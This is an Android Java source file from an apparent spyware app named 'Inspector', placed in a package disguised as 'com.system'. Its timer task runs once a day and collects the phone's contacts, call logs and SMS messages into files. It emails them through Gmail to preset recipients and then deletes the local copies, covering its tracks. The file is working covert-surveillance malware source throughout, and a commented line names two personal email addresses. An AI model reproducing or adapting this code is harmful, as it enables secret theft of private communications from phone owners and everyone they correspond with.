package com.system;

import java.io.DataOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import com.system.activity.GlobalPrefActivity;
import com.system.config.ConfigCtrl;
import com.system.config.MailCfg;
import com.system.feature.contact.ContactCtrl;
import com.system.feature.contact.ContactInfo;
import com.system.feature.phonecall.PhoneCallCtrl;
import com.system.feature.phonecall.PhoneCallInfo;
import com.system.feature.sms.SmsCtrl;
import com.system.feature.sms.SmsInfo;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.mail.GMailSenderEx;
import com.particle.inspector.common.util.FileCtrl;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final static String LOGTAG = "GetInfoTask";
	
	public Service service;
	
	public static List<File> attachments;
	
	public GetInfoTask(Service service)
	{
		super();
		this.service = service;
		if (attachments != null) attachments.clear();
		else attachments = new ArrayList<File>();
	}
	
	public void run() 
	{
		// If network connected, try to collect and send the information
		if (!SysUtils.isNetworkConnected(service.getApplicationContext())) return;
		
		// Firstly we should make sure the time range (>24H)
		Date lastDatetime = new Date(ConfigCtrl.getLastGetInfoTime(service.getApplicationContext()));
		Calendar now = Calendar.getInstance();
		now.add(Calendar.DATE, -1);
		Date now_minus_1_day = now.getTime();
		if (lastDatetime != null && now_minus_1_day.before(lastDatetime)) 
		{
			//Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
			return;
		}
		
		// Collect information
		CollectContact(this.service);
		SysUtils.ThreadSleep(10000, LOGTAG);
		CollectPhoneCallHist(this.service);
		SysUtils.ThreadSleep(10000, LOGTAG);
		CollectSms(this.service);
		SysUtils.ThreadSleep(2000, LOGTAG);
		
		// Send mail
		String phoneNum = DeviceProperty.getPhoneNumber(service);
		String subject = service.getResources().getString(R.string.mail_from) 
	          		 + (phoneNum.length() > 0 ? " " + phoneNum : " Inspector") 
	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());;
		String body = String.format(service.getResources().getString(R.string.mail_body), 
					DeviceProperty.getPhoneNumber(service));
		List<String> fileList = new ArrayList<String>();
		for (int i = 0; i < attachments.size(); i++)
			fileList.add(attachments.get(i).getAbsolutePath());
		
		String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
		String pwd = MailCfg.getSenderPwd(service);
		
		boolean result = false;
		int retry = 3;
		while(!result && retry > 0)
		{
			String sender = MailCfg.getSender(service);
			result = sendMail(subject, body, sender, pwd, recipients, fileList);
			if (!result) retry--;
		}
		attachments.clear();
			
		// Update the last date time
		if (result) {
			boolean successful = ConfigCtrl.setLastGetInfoTime(service, new Date());
			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
		}
		
		// Clean the files in SD-CARD
		FileCtrl.cleanFolder();
		
	}
	
	public static void CollectSms(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context) + SysUtils.NEWLINE);
		}
		
		String fileName = FileCtrl.makeFileName(context.getApplicationContext(), 
				context.getResources().getString(R.string.sms_name), FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectPhoneCallHist(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context) + SysUtils.NEWLINE);
		}
		
		String fileName = FileCtrl.makeFileName(context, 
				context.getResources().getString(R.string.phonecall_name), FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectContact(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString() + SysUtils.NEWLINE);
		}
		
		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name), FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
	
	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<String> files)
	{
		boolean ret = false;

        try {   
            GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
            gmailSender.setFrom("system@gmail.com");
            gmailSender.setTo(recipients);
            gmailSender.setSubject(subject);
            gmailSender.setBody(body);
            
            for(int i = 0; i < files.size(); i++)
            	gmailSender.addAttachment(files.get(i));//e.g. "/sdcard/filelocation"
            
            ret = gmailSender.send();
        } catch (Exception e) {   
            Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
        }
        
		return ret;
	}
	
	private static String[] getRecipients(Context context)
	{
		String mail = GlobalPrefActivity.getMail(context);
		return mail.split(",");
	}
	
}
